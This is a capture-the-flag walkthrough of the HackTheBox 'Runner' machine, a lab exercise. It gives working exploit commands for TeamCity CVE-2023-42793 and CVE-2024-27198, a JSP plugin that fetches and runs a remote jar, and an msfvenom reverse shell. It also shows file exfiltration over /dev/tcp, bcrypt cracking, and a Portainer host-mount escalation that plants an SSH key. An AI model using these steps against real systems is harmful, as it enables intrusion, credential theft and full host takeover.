---
render_with_liquid: false
title: HackTheBox Writeup  Runner
date: 2024-04-24 22:34:59 +1400
tags: [hackthebox, nmap, linux, feroxbuster, gobuster, subdomain, jetbrains-teamcity, searchsploit, jsp, msfvenom, docker, docker-escape, docker-mount, discover-secrets, gitleaks, ssh-key-spray, hashcat, portainer, portainer-privesc, metasploit]
---




# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ pt init '10.10.11.13 runner.htb teamcity.runner.htb portainer-administration.runner.htb runner'
+---------+--------+-------------+-------------------------------------+
| PROFILE | STATUS |     IP      |               DOMAIN                |
+---------+--------+-------------+-------------------------------------+
| runner  | on     | 10.10.11.13 | runner.htb                          |
| runner  | on     | 10.10.11.13 | teamcity.runner.htb                 |
| runner  | on     | 10.10.11.13 | portainer-administration.runner.htb |
| runner  | on     | 10.10.11.13 | runner                              |
+---------+--------+-------------+-------------------------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Apr 24 22:34:59 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,8000, runner
Nmap scan report for runner (10.10.11.13)
Host is up, received user-set (0.19s latency).
Scanned at 2024-04-24 22:34:59 CST for 15s

PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Apr 24 22:35:14 2024 -- 1 IP address (1 host up) scanned in 14.90 seconds
```

## 80 - HTTP : Static site about CI/CD Specialists


### Info

```ruby
http://runner.htb [200] [Runner - CI/CD Specialists] [nginx/1.18.0 (Ubuntu)] [Bootstrap,Nginx:1.18.0,OWL Carousel,Ubuntu,jQuery] [a82637c30839549e81e723a76f462499671c41b4]
```

![](/assets/obsidian/2f0985e35f6ac1f8aa892f95a10374fd.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://$(pt get rhost)" -o ferox_80.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ cat ferox_80.txt | grep -vE 'http://runner.htb/assets/'
200      GET      391l     1284w    16910c http://runner.htb/index.html
200      GET      391l     1284w    16910c http://runner.htb/
```

### Subdomains

```bash
gobuster vhost --append-domain -o gobuster_vhosts.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -k -t 100 -u http://$(pt get rhost)
```

```bash
Found: teamcity.runner.htb Status: 401 [Size: 66]
```


## 8000 - HTTP : 404 page


### Info

```ruby
http://runner.htb:8000 [404] [] [] [475c848673a3f79fa778f01c2bd5a721d4c41707]
```

![](/assets/obsidian/967132decff088b502acada03e98cf45.png)

### Directory

```bash
feroxbuster -k -t 100 -u "http://$(pt get rhost):8000" -o ferox_8000.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ cat ferox_8000.txt
200      GET        1l        1w        3c http://runner.htb:8000/health
200      GET        1l        1w        9c http://runner.htb:8000/version
```

## 80 - teamcity.runner.htb : JetBrains TeamCity 2023.05.3


### Info

```ruby
http://teamcity.runner.htb [302,200] [Log in to TeamCity — TeamCity] [nginx/1.18.0 (Ubuntu)] [Apache Tomcat,HSTS,Java,Moment.js,Nginx:1.18.0,Prototype,React,TeamCity,Ubuntu,Underscore.js,jQuery] [http://teamcity.runner.htb/login.html] [e4a8502da357aee077601412a4239800c036d3a0]
```

![](/assets/obsidian/33a7727ec0d7d78a7bfeffea635ca13a.png)

# User Flag
---

## Shell as tcuser in docker container


### 80 - TeamCity 2023.05.3 : RCE (CVE-2023-42793)

- Google : `TeamCity 2023.05.3 exploit`

> POC - https://www.exploit-db.com/exploits/51884

> Reference - https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/

> Other **CVE**s can be easily detected by **nuclei** templates
> 
> ![](/assets/obsidian/00d04b331b37604591200df0f1918b76.png)
{: .prompt-tip }

This exploit can create an admin account without authentication

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner/exploit]
└─$ searchsploit -m 51884
  Exploit: JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51884
     Path: /usr/share/exploitdb/exploits/java/remote/51884.py
    Codes: CVE-2023-42793
 Verified: False
File Type: ASCII text, with very long lines (312)
Copied to: /home/kali/htb/Runner/exploit/51884.py
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner/exploit]
└─$ python 51884.py -u http://teamcity.runner.htb -v

=====================================================
*       CVE-2023-42793                              *
*  TeamCity Admin Account Creation                  *
*                                                   *
*  Author: ByteHunter                               *
=====================================================

Token: eyJ0eXAiOiAiVENWMiJ9.VUZJb3VjYVpLZ3NzaTdrTld6N2FWVm9Pdi1V.YjY1MDdkOGYtZDg0ZS00NTQ4LWIwNTYtZGJlYjNkOWYyMmZl
Successfully exploited!
URL: http://teamcity.runner.htb
Username: city_adminHlUy
Password: Main_password!!**
Final curl command: curl --path-as-is -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.VUZJb3VjYVpLZ3NzaTdrTld6N2FWVm9Pdi1V.YjY1MDdkOGYtZDg0ZS00NTQ4LWIwNTYtZGJlYjNkOWYyMmZl" -X POST http://teamcity.runner.htb/app/rest/users -H "Content-Type: application/json" --data '{"username": "city_adminHlUy", "password": "theSecretPass!", "email": "nest@nest", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'
```

After login as administrator, found out we can upload plugins (like we can with **wordpress**)

> http://teamcity.runner.htb/admin/admin.html?item=plugins

![](/assets/obsidian/131df6c990176856774adfa451b3f25f.png)

- Google : `teamcity plugin reverse shell`

> Reference - https://github.com/kacperszurek/pentest_teamcity?tab=readme-ov-file#shell-on-server

It showcased a plugin that can execute `.jar` file from remote URL, below is the source code

> `Hello.jsp`

```jsp
<%@ page import="java.io.File" %>
<html>
<body>
OKK
<%
    String file_path = System.getProperty("java.io.tmpdir") + File.separator + request.getParameter("file_path");
    String java_path = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
%>
<%= file_path %>
<%= java_path %>
<%
    try {
        org.apache.commons.io.FileUtils.copyURLToFile(new java.net.URL(request.getParameter("file_url")), new File(file_path));
        ProcessBuilder pb = new ProcessBuilder(java_path, "-jar", file_path);
        Process p = pb.start();
    } catch (Exception x) { x.printStackTrace(System.out); }
%>

</body>
</html>
```

I will just download the precompiled plugin, since the plugin requires special format, filename and files (`server` folder, `teamcity-plugin.xml`)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ wget https://github.com/kacperszurek/pentest_teamcity/raw/master/exploits/serverplugin.zip
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ 7z l serverplugin.zip
[...]

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-02-10 21:52:36 D....            0            0  server
2018-02-10 21:52:36 ....A         4157         2555  server/demoPlugin-server-1.0-SNAPSHOT.jar
2018-01-30 12:35:26 ....A          700          351  teamcity-plugin.xml
------------------- ----- ------------ ------------  ------------------------
2018-02-10 21:52:36               4857         2906  2 files, 1 folders
```

Upload and enable the plugin (`Server Administration->Plugins`)

![](/assets/obsidian/9e3a749e9c3bdeb01deab1ac4f8f6d6f.png)

Restart the server (`Server Administration->Diagnostics->Troubleshooting->Restart server`)

![](/assets/obsidian/c756522ef7cee0a88668c4f80f27bd70.png)

![](/assets/obsidian/93a0c127b971ba1978504c1b6ab0ce6c.png)

![](/assets/obsidian/db079f76c97a00ce48265c6ee70cb79f.png)

Generate a java reverse shell payload then host on http server

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ mkdir www

┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ cd www

┌──(bravosec㉿fsociety)-[~/htb/Runner/www]
└─$ msfvenom -p java/shell_reverse_tcp LHOST=$(pt get lhost) LPORT=1111 -f jar > rev.jar
Payload size: 7498 bytes
Final size of jar file: 7498 bytes


┌──(bravosec㉿fsociety)-[~/htb/Runner/www]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After the server was restarted, load `jar` reverse shell

- URI format

```bash
http://teamcity/demoPlugin.html?file_url=http://attacker/my_malicious.jar&file_path=random_name.jar
```

![](/assets/obsidian/e09d8cc0bf1abb3de30e509a92e5729c.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner/www]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.107] from (UNKNOWN) [10.10.11.13] 35528
/usr/bin/script -qc /bin/bash /dev/null
   Welcome to TeamCity Server Docker container

 * Installation directory: /opt/teamcity
 * Logs directory:         /opt/teamcity/logs
 * Data directory:         /data/teamcity_server/datadir

   TeamCity will be running under 'tcuser' user (1000/1000)

tcuser@647a82f29ca0:~/bin$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Runner/www]
└─$ stty raw -echo;fg
stty rows 50 columns 209
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
tcuser@647a82f29ca0:~/bin$ stty rows 50 columns 209
tcuser@647a82f29ca0:~/bin$ id
uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)
```

## From tcuser in docker container to john on host machine


### Enumeration

- Users

```bash
tcuser@647a82f29ca0:~/bin$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
tcuser:x:1000:1000::/opt/teamcity:/bin/sh
```

- It's a docker container

```bash
tcuser@647a82f29ca0:~/bin$ ls -la /
total 84
[...]
drwxr-xr-x   3 root   root   4096 Aug 24  2023 data
drwxr-xr-x   5 root   root    340 Apr 26 01:19 dev
-rwxr-xr-x   1 root   root      0 Feb 28 19:05 .dockerenv
[...]
-rwxr-xr-x   1 root   root    280 Aug 24  2023 welcome.sh
```

- `/data/teamcity_server/datadir` was mounted at host machine, which means the user who configured **teamcity** might left something there

```bash
tcuser@647a82f29ca0:~$ mount
[...]
/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda2 on /etc/hostname type ext4 (rw,relatime)
/dev/sda2 on /etc/hosts type ext4 (rw,relatime)
/dev/sda2 on /data/teamcity_server/datadir type ext4 (rw,relatime)
/dev/sda2 on /opt/teamcity/logs type ext4 (rw,relatime)
/dev/sda2 on /opt/teamcity/temp type ext4 (rw,relatime)
[...]
```

### Discover ssh private key

Transfer `/data/teamcity_server/datadir` to kali

```bash
tcuser@647a82f29ca0:~$ tar cf /tmp/datadir.tar /data/teamcity_server/datadir
tar: Removing leading `/' from member names
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ nc -lvnp 443 > datadir.tar
```

```bash
tcuser@647a82f29ca0:~$ cat /tmp/datadir.tar > /dev/tcp/10.10.14.107/443
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ 7z x datadir.tar -o'loot/datadir'
```

Scan for secrets, found an ssh private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner/loot]
└─$ gitleaks detect -r gitleaks.json -v --no-git -s datadir

    ○
    │╲
    │ ○
    ○ ░
    ░    gitleaks

Finding:     -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdz...-
Secret:      -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdz...
RuleID:      private-key
Entropy:     6.009122
File:        datadir/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa
Line:        1
Fingerprint: datadir/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa:private-key:1

11:05AM INF scan completed in 5.49s
11:05AM WRN leaks found: 1
```

### SSH private key spray

Next thing is to find usernames that can use the key

(No positive result) First, I spray the key with common usernames

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner/loot]
└─$ cp datadir/data/teamcity_server/datadir/config/projects/AllProjects/pluginData/ssh_keys/id_rsa .

┌──(bravosec㉿fsociety)-[~/htb/Runner/loot]
└─$ chmod 600 id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Runner/loot]
└─$ nxc ssh $(pt get rhost) -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p '' --key-file id_rsa
SSH         10.10.11.13     22     runner.htb       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
SSH         10.10.11.13     22     runner.htb       [-] root: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] admin: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] test: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] guest: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] info: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] adm: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] mysql: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] user: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] administrator: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] oracle: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] ftp: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] pi: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] puppet: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] ansible: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] ec2-user: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] vagrant: q must be exactly 160, 224, or 256 bits long
SSH         10.10.11.13     22     runner.htb       [-] azureuser: q must be exactly 160, 224, or 256 bits long
```

Check the list of users from **teamcity**

> http://teamcity.runner.htb/admin/admin.html?item=users

![](/assets/obsidian/ba6bbd9e7596ef8d8b6e117b342ae0ed.png)

Usernames that belong to `runner.htb` are :

> `users_teamcity.lst`

```bash
john
matthew
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ nxc ssh $(pt get rhost) -u users_teamcity.lst -p '' --key-file loot/id_rsa --continue-on-success
SSH         10.10.11.13     22     runner.htb       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
SSH         10.10.11.13     22     runner.htb       [+] john: (keyfile: loot/id_rsa)  (non root) Linux - Shell access!
SSH         10.10.11.13     22     runner.htb       [-] matthew: q must be exactly 160, 224, or 256 bits long
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ ssh -i loot/id_rsa john@$(pt get rhost)
Warning: Permanently added 'runner.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)
[...]
john@runner:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
john@runner:~$ cat user.txt
829319b69cfb36ab7310160548c5c9a4
```

# Root Flag
---

## From john to root


### Enumeration

- Users : 2 regular users

```bash
john@runner:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
matthew:x:1000:1000:,,,:/home/matthew:/bin/bash
john:x:1001:1001:,,,:/home/john:/bin/bash
```

- `/etc/fstab` was configured to hide processes from each users (Users can only see own processes)

```bash
john@runner:~$ cat /etc/fstab
[...]
proc /proc proc remount,rw,hidepid=2,noexec,nosuid,nodev 0 0
```

- `data` folder is unexpected in root folder
	- `portainer.db` seems interesting

```bash
john@runner:~$ ls -la /
total 72
drwxr-xr-x  19 root root  4096 Apr  4 10:24 .
drwxr-xr-x  19 root root  4096 Apr  4 10:24 ..
lrwxrwxrwx   1 root root     7 Feb 17  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Apr 15 09:44 boot
drwxr-xr-x   9 root root  4096 Feb 28 10:31 data
[...]
```

```bash
john@runner:/data$ ls -latr
total 132
drwx------  2 root root   4096 Feb 28 07:51 tls
drwx------  2 root root   4096 Feb 28 07:51 compose
drwx------  2 root root   4096 Feb 28 07:51 bin
-rw-------  1 root root    190 Feb 28 07:51 portainer.pub
-rw-------  1 root root    227 Feb 28 07:51 portainer.key
drwx------  2 root root   4096 Feb 28 07:51 docker_config
drwx------  2 root root   4096 Feb 28 07:51 chisel
drwx------  2 root root   4096 Feb 28 07:51 certs
drwxr-xr-x  9 root root   4096 Feb 28 10:31 .
drwxr-xr-x  4 root root   4096 Feb 28 10:31 teamcity_server
drwxr-xr-x 19 root root   4096 Apr  4 10:24 ..
-rw-------  1 root root 131072 Apr 26 04:28 portainer.db
```

- Discovered a new vhost  : `portainer-administration.runner.htb`

```bash
john@runner:~$ cat /etc/nginx/sites-enabled/
default    portainer  teamcity
john@runner:~$ cat /etc/nginx/sites-enabled/portainer
server {
    listen 80;
    server_name portainer-administration.runner.htb;

    location / {
        proxy_pass https://localhost:9443;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

> http://portainer-administration.runner.htb/#!/auth

![](/assets/obsidian/0fcd0410d5dcbb5a524793b387c4cb4e.png)

### Dump TeamCity's database

We need valid credentials to try on **portainer**, dump **teamcity**'s database

> http://teamcity.runner.htb/admin/admin.html?item=backup

Select `Custom->database` to reduce the backup size

![](/assets/obsidian/e8cbda0d0b9468c2e95112a46ddc8008.png)

![](/assets/obsidian/552566ab49578d28a7d237b60c1efdbc.png)

Transfer the backup file to kali

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ nc -lvnp 443 > loot/TeamCity_Backup_20240426_042215.zip
```

```bash
tcuser@647a82f29ca0:~$ cat /data/teamcity_server/datadir/backup/TeamCity_Backup_20240426_042215.zip > /dev/tcp/10.10.14.107/443
```

### Crack user hashes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner/loot]
└─$ 7z x TeamCity_Backup_20240426_042215.zip -o'TeamCity_Backup_20240426_042215'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner/loot]
└─$ cd TeamCity_Backup_20240426_042215

┌──(bravosec㉿fsociety)-[~/htb/Runner/loot/TeamCity_Backup_20240426_042215]
└─$ cat database_dump/users
ID, USERNAME, PASSWORD, NAME, EMAIL, LAST_LOGIN_TIMESTAMP, ALGORITHM
1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1714109801524, BCRYPT
2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
11, city_adminhxaa, $2a$07$dHbchjpJcA1SVRmBAUSRwOCaUkT1JPCwFdgb9ns4XE3C.Y/aG1fmW, , angry-admin@funnybunny.org, 1714109822452, BCRYPT
```

Extract the hashes to **hashcat** format

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ cat loot/TeamCity_Backup_20240426_042215/database_dump/users | tail -n +2 | awk -F', ' '{print $2":"$3}' > teamcity_users.hash
```

Crack the hash

```powershell
hashcat.exe H:\VM-Share\Kali\teamcity_users.hash H:\VM-Share\Kali\rockyou.txt --user -m 3200 -w 3
```

Only `matthew`'s password was cracked

```bash
PS C:\Users\X> hashcat.exe H:\VM-Share\Kali\teamcity_users.hash H:\VM-Share\Kali\rockyou.txt --user -m 3200 -w 3 --show
matthew:$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
```

### Portainer - Privilege escalation

> **What is Portainer?**
> Portainer is a powerful, GUI-based Container-as-a-Service solution that helps organizations manage and deploy cloud-native applications easily and securely.
{: .prompt-info }

> http://portainer-administration.runner.htb/#!/home

Logged in successful with `matthew`:`piper123`

![](/assets/obsidian/ca35532f53ab773985462de9281d62ec.png)

Very similar to privilege escalation with **docker** by bind mounting root folder from host, just doing through web UI instead of CLI this time

The process to specify `mountpoint` in **portainer** requires more work though

1. Create a volume to bind mount the root device

> Reference - https://docs.portainer.io/user/docker/volumes/add

Instead of entering the `mountpoint` directly, we need to specify `type` and `device`, which can be gathered from `/etc/fstab`

![](/assets/obsidian/2fef3579af7a2818acd03df785d1f424.png)

```bash
john@runner:~$ cat /etc/fstab

# /etc/fstab: static file system information.

#

# Use 'blkid' to print the universally unique identifier for a

# device; this may be used with UUID= as a more robust way to name devices

# that works even if disks are added and removed. See fstab(5).

#

# <file system> <mount point>   <type>  <options>       <dump>  <pass>

# / was on /dev/sda2 during curtin installation
/dev/sda2 / ext4 defaults 0 1
/dev/sda3 none swap sw 0 0
proc /proc proc remount,rw,hidepid=2,noexec,nosuid,nodev 0 0
```

> http://portainer-administration.runner.htb/#!/1/docker/volumes/new

![](/assets/obsidian/f8d01b6607aa15c1b6d088b242620192.png)

2. Check available images : There's 2, `ubuntu` and `teamcity`

> http://portainer-administration.runner.htb/#!/1/docker/images

![](/assets/obsidian/3bb27c1b968a249487d9c85855d48c98.png)

3. Copy the sha256 hash of an image : I chose `ubuntu`

> http://portainer-administration.runner.htb/#!/1/docker/images/sha256:ca2b0f26964cf2e80ba3e084d5983dab293fdb87485dc6445f3f7bbfc89d7459

![](/assets/obsidian/11fb8bc8f16c5432c2df77a337627f54.png)

4. **Containers** -> Add container

> http://portainer-administration.runner.htb/#!/1/docker/containers/new

Specify the sha256 hash for `image`

![](/assets/obsidian/2dc07194a8b8566ea1bf4ec5c47f9250.png)

**Advanced container settings** -> **Command  logging** -> Set `Console` and `User`

![](/assets/obsidian/a6a849087796fab30f6c76378c15ef28.png)

**Advanced container settings** -> **Volumes** -> Select the one previously created and mount on `/mnt/hosts`

![](/assets/obsidian/26b3687c6a970836c392c5bbb1aeb670.png)

Deploy container

![](/assets/obsidian/678989062c2c24a439641167292c3b8b.png)

5. **Container list** -> **Console**

![](/assets/obsidian/3a4fdcd8f18edf67e6bf0443686cfbc1.png)

Connect to container

![](/assets/obsidian/e44d2af282ca9d1ccefe7c2ac1b64ae8.png)

### Add ssh keys to root's authorized keys

Now I can write my ssh public key to `root`'s ssh authorized keys (For some reasons `root`'s private key doesn't work)

Generate ssh keys first

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ ssh-keygen -f bravosec
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in bravosec
Your public key has been saved in bravosec.pub
The key fingerprint is:
SHA256:m69Iq9r/ubuAOOU+i+aRdL4OjxmcKl600GKYfLjQKn8 bravosec@fsociety
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|                 |
|ooo              |
|+*o+o   S        |
|o+*O..   o       |
|o.Xo+ o o        |
|ooo%Eo + o       |
|++B+O=+.B=.      |
+----[SHA256]-----+

┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ cat bravosec.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0rmPCu3kmjCBP+gp7pHYDg42Bz8lhbogoXv3AD76+C bravosec@fsociety
```

Write ssh keys from web console

```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC0rmPCu3kmjCBP+gp7pHYDg42Bz8lhbogoXv3AD76+C bravosec@fsociety' >> /mnt/host/root/.ssh/authorized_keys
```

![](/assets/obsidian/91719f5a0076369da661c7452f6d0a4d.png)

SSH as root

```bash
┌──(bravosec㉿fsociety)-[~/htb/Runner]
└─$ ssh -i bravosec root@$(pt get rhost)
[...]
root@runner:~# id
uid=0(root) gid=0(root) groups=0(root)
root@runner:~# cat root.txt
500c74d6f74591fb086d785fa9559de5
```

# Additional
---

## 80 - JetBrains TeamCity : Auth bypass to RCE w/ metasploit (CVE-2024-27198)

```bash
use multi/http/jetbrains_teamcity_rce_cve_2024_27198
setg lhost tun0
set RHOSTS teamcity.runner.htb
set RPORT 80
exploit
```

```bash
msf6 exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > exploit

[*] Started reverse TCP handler on 10.10.14.107:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.05.3 (build 129390) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.Rlc2bFhmQ2xNTUNfVG1RZ011aUtjQUV1UmZv.ZTliYzg1MzItM2U0Ni00YjYyLWEyNzgtMDFmNzc3ZDY0NGU5
[*] Uploading plugin: BpMLePcV
[*] Sending stage (57971 bytes) to 10.10.11.13
[*] Deleting the plugin...
[+] Deleted /opt/teamcity/work/Catalina/localhost/ROOT/TC_129390_BpMLePcV
[*] Deleting the authentication token...
[+] Deleted /data/teamcity_server/datadir/system/caches/plugins.unpacked/BpMLePcV
[*] Meterpreter session 1 opened (10.10.14.107:4444 -> 10.10.11.13:47074) at 2024-04-26 12:16:22 +0800
[!] This exploit may require manual cleanup of '/opt/teamcity/webapps/ROOT/plugins/BpMLePcV' on the target

meterpreter > getuid
Server username: tcuser
```